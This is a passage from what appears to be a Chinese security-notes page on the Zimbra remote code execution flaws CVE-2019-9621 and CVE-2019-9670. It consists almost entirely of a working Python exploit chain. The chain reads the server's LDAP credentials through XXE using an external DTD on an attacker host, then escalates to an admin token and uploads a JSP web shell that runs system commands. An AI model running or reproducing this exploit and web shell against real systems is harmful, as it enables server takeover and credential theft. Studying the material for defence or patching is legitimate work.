		<p class="cs40DD2BC9"><span><img src="Web安全/Zimbra/%ef%bc%88CVE-2019-9621%ef%bc%89%ef%bc%88CVE-2019-9670%ef%bc%89Zimbra%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="253" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">#coding=utf8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">base_url=sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">base_url=base_url.rstrip(&quot;/&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">利用</span><span class="cs9FB05234">request</span><span class="cs7FFD2630">模块来发包和接受数据，</span><span class="cs9FB05234">sys</span><span class="cs7FFD2630">模块用来传参，并删除最右侧的</span><span class="cs9FB05234">/</span><span class="cs7FFD2630">斜杠</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">filename = &quot;sunian.jsp&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">fileContent = r&#39;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1){out.println(new String(b));}out.print(&quot;&lt;/pre&gt;&quot;);}%&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#fileContent = r&#39;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;sun.misc.BASE64Decoder&quot;%&gt;&lt;%try {String cmd = request.getParameter(&quot;tom&quot;);String path=application.getRealPath(request.getRequestURI());String dir=&quot;weblogic&quot;;if(cmd.equals(&quot;NzU1Ng&quot;)){out.print(&quot;[S]&quot;+dir+&quot;[E]&quot;);}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(&quot;-&gt;|&quot;);int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print(&quot;|&lt;-&quot;);try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">可使用第</span><span class="cs9FB05234">11</span><span class="cs7FFD2630">行</span><span class="cs9FB05234">bypass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(base_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">请自己在公网放置</span><span class="cs9FB05234">dtd</span><span class="cs7FFD2630">文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">dtd_url=&quot;http://VPS-IP/exp.dtd&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">xxe_data = r&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;!ENTITY % dtd SYSTEM &quot;{dtd}&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%dtd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%all;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Request&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/Request&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/Autodiscover&gt;&quot;&quot;&quot;.format(dtd=dtd_url)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#XXE stage</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Content-Type&quot;:&quot;application/xml&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;[*] Get User Name/Password By XXE &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(base_url+&quot;/Autodiscover/Autodiscover.xml&quot;,data=xxe_data,headers=headers,verify=False,timeout=15)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print r.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if &#39;response schema not available&#39; not in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;don&#39;t have xxe&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#low_token Stage</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pattern_name = re.compile(r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_user(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pattern_password = re.compile(r&quot;&amp;lt;key name=(\&quot;|&amp;quot;)zimbra_ldap_password(\&quot;|&amp;quot;)&amp;gt;\n.*?&amp;lt;value&amp;gt;(.*?)&amp;lt;\/value&amp;gt;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">username = pattern_name.findall(r.text)[0][2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = pattern_password.findall(r.text)[0][2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(username)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(password)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">auth_body=&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Header&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/context&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Header&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;soap:Body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;AuthRequest xmlns=&quot;{xmlns}&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;account by=&quot;adminName&quot;&gt;{username}&lt;/account&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;password&gt;{password}&lt;/password&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&lt;/AuthRequest&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&lt;/soap:Body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/soap:Envelope&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#print(&quot;[*] Get Low Privilege Auth Token&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#72</span><span class="cs7FFD2630">行路径可能为</span><span class="cs9FB05234">/service/soap</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r=requests.post(base_url+&quot;/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAccount&quot;,username=username,password=password),verify=False)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">pattern_auth_token=re.compile(r&quot;&lt;authToken&gt;(.*?)&lt;/authToken&gt;&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">low_priv_token = pattern_auth_token.findall(r.text)[0]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#print(low_priv_token)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># SSRF+Get Admin_Token Stage</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers[&quot;Cookie&quot;]=&quot;ZM_ADMIN_AUTH_TOKEN=&quot;+low_priv_token+&quot;;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Host&quot;]=&quot;foo:7071&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(&quot;[*] Get Admin &nbsp;Auth Token By SSRF&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#r = requests.post(base_url+&quot;/service/proxy?target=https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(base_url+&quot;/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">若</span><span class="cs9FB05234">86</span><span class="cs7FFD2630">行无法使用请使用</span><span class="cs9FB05234">85</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">admin_token =pattern_auth_token.findall(r.text)[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(&quot;ADMIN_TOKEN:&quot;+admin_token)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">f = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;filename1&#39;:(None,&quot;whocare&quot;,None),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;clientFile&#39;:(filename,fileContent,&quot;text/plain&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;requestId&#39;:(None,&quot;12&quot;,None),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers ={</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=&quot;+admin_token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;[*] </span><span class="cs7FFD2630">木马地址</span><span class="cs9FB05234">&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(base_url+&quot;/service/extension/clientUploader/upload&quot;,files=f,headers=headers,verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(r.text)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(base_url+&quot;/downloads/&quot;+filename)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#print(&quot;[*] Request Result:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">s = requests.session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = s.get(base_url+&quot;/downloads/&quot;+filename,verify=False,headers=headers)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#print(r.text)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;[*] </span><span class="cs7FFD2630">管理员</span><span class="cs9FB05234">cookie&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(headers[&#39;Cookie&#39;])</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/dgjnszf/p/10793604.html</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7991#toc-1</span></p></body>
</html>
